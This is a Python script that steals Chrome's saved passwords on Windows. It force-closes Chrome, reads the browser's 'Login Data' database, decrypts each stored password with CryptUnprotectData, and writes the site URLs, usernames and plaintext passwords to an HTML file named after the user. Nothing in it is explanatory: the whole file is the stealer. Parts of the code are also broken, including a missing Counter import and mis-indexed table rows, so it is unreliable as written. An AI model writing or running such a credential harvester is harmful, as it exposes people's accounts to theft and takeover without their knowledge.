import os, time
import sqlite3
import win32crypt

path = os.getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data"

def most_common(lst):
    data = Counter(lst)
    return max(lst, key=data.get)

def html_info(info):
    s = ""
    s += '<style type="text/css">\ntd{ padding: 0 50px 0 0px; }\n</style>\n'

    usrn = "PC-{}".format(os.getlogin())
    s += '<h4>Found {} password for {}</h4>\n'.format(len(info[0]), usrn)
    s += '<table>\n<tbody>\n'

    for u in range(len(info[0])):
        s += "<tr>\n"
        s += "<td>{}</td>\n".format((info[0]))[u]
        s += "<td>{}</td>\n".format((info[1]))[u]
        s += "<td>{}</td>\n".format((info[2]))[u]
        s += "</tr>\n"

    s += "</tbody>\n</table>\n"

    return s

def getcachedpass():
    # Close all chrome tabs
    os.system("taskkill /F /IM chrome.exe")

    # Connect to sqlite database
    conn = sqlite3.connect(path)
    cursor = conn.cursor()

    # Read login data from cache
    cursor.execute('Select action_url, username_value, password_value FROM logins')
    urls = []
    usrs = []
    pwds = []

    for result in cursor.fetchall():
        password = str(win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1])[2:-1]

        if password != "" and result[1] != "":
            urls.append(result[0])
            usrs.append(result[1])
            pwds.append(password)
            
    return(urls, usrs, pwds)

info = getcachedpass()

# Save as file
filename = "PC-{}.html".format(os.getlogin())
fp = open("{}".format(filename), 'w')
fp.write(html_info(info))
fp.close()